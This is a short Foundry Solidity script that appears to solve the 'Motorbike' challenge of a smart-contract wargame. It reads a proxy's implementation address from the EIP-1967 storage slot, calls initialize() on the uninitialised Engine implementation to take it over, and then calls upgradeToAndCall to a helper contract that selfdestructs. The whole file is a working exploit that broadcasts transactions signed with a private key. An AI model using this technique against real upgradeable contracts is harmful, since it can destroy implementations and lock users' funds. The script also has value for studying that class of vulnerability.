// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";

import {Motorbike} from "src/Motorbike.sol";
import {Engine} from "src/Engine.sol";
import {Selfdestructable} from "src/Selfdestructable.sol";

contract MotorbikeScript is Script {
    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);

        address motorbike = 0xB4c375181a8Bc3B142dEF2580a944351cD26ca4B;
        address impl = address(
            uint160(uint256(vm.load(motorbike, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))
        );

        Selfdestructable helper = new Selfdestructable();

        Engine(impl).initialize();
        Engine(impl).upgradeToAndCall(address(helper), abi.encodeWithSelector(Selfdestructable.destroy.selector));

        vm.stopBroadcast();
    }
}
